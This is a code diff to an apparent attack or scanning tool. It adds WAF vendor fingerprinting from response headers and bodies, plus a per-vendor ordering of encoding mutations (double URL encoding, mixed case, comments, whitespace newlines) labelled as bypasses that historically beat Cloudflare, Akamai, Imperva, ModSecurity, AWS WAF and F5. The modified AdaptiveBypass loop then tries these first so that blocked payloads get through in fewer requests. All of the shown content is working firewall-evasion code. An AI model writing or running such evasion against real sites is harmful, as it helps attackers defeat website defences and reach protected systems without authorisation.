@@ -34,6 +34,45 @@ def is_blocked(resp) -> bool:
     return any(m in body for m in _WAF_MARKERS)
 
 
+# Per-vendor fingerprints (body + headers) so a block can be attributed to a WAF family,
+# and each family's known-good encoding tried FIRST — like a hacker who fingerprints the
+# WAF instead of walking a generic list. Pure ordering of the SAME read-only mutations.
+_WAF_FAMILY_MARKERS = {
+    "cloudflare": ("cloudflare", "attention required", "cf-ray", "__cf", "cf-chl"),
+    "akamai": ("akamai", "akamaighost", "reference #", "ak-bmsc"),
+    "imperva": ("imperva", "incapsula", "_incap_", "visid_incap", "x-iinfo"),
+    "modsecurity": ("mod_security", "modsecurity", "not acceptable"),
+    "aws_waf": ("awselb", "x-amzn", "x-amz-", "aws-waf"),
+    "f5": ("big-ip", "bigip", "the requested url was rejected", "x-waf-event"),
+}
+# Family -> preferred _MUTATORS labels (bypasses that historically beat that vendor).
+_FAMILY_MUTATORS = {
+    "cloudflare": ("double_url", "url_encode", "mixed_case"),
+    "akamai": ("url_encode", "double_url", "case_swap"),
+    "imperva": ("ws_newline", "url_encode", "double_url"),
+    "modsecurity": ("comment", "url_encode", "ws_newline"),
+    "aws_waf": ("mixed_case", "case_swap", "comment"),
+    "f5": ("url_encode", "double_url", "comment"),
+}
+
+
+def waf_family(resp):
+    """Best-effort WAF-vendor fingerprint from a block response's body + headers, or None."""
+    if resp is None:
+        return None
+    body = (getattr(resp, "body", "") or "")[:4000].lower()
+    headers = getattr(resp, "headers", {}) or {}
+    try:
+        hdrs = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
+    except Exception:  # noqa: BLE001
+        hdrs = ""
+    hay = body + " " + hdrs
+    for fam, markers in _WAF_FAMILY_MARKERS.items():
+        if any(m in hay for m in markers):
+            return fam
+    return None
+
+
 def _mixed_case(p: str) -> str:
     out, upper = [], True
     for ch in p:
@@ -102,10 +141,17 @@ class AdaptiveBypass:
         """Send `payload` via `send(variant)`, escalating mutations on a block.
 
         Returns as soon as a variant is NOT blocked; records the winning mutation
-        for `target`. If every variant is blocked, returns the last response with
-        ``blocked=True`` (the caller decides — never a fabricated success)."""
+        for `target`. On the FIRST block it fingerprints the WAF vendor and floats that
+        family's known-good mutations to the front of the remaining queue (pure ordering
+        of the same read-only variants — reaches a working bypass in fewer requests). If
+        every variant is blocked, returns the last response with ``blocked=True`` (the
+        caller decides — never a fabricated success)."""
+        variants = self._ordered(payload, target)
         last = None
-        for label, variant in self._ordered(payload, target):
+        reordered = False
+        idx = 0
+        while idx < len(variants):
+            label, variant = variants[idx]
             resp = await send(variant)
             last = (label, variant, resp)
             if not is_blocked(resp):
@@ -113,6 +159,15 @@ class AdaptiveBypass:
                     self._learned[target] = label
                 return BypassResult(resp, variant, label,
                                     bypassed=(label != "raw"), blocked=False)
+            if not reordered:                      # fingerprint on the first block
+                reordered = True
+                fam = waf_family(resp)
+                pref = _FAMILY_MUTATORS.get(fam) if fam else None
+                if pref:
+                    rest = variants[idx + 1:]
+                    rest.sort(key=lambda lv: pref.index(lv[0]) if lv[0] in pref else len(pref))
+                    variants = variants[:idx + 1] + rest
+            idx += 1
         if last is None:
             return BypassResult(None, payload, "raw", bypassed=False, blocked=True)
         label, variant, resp = last
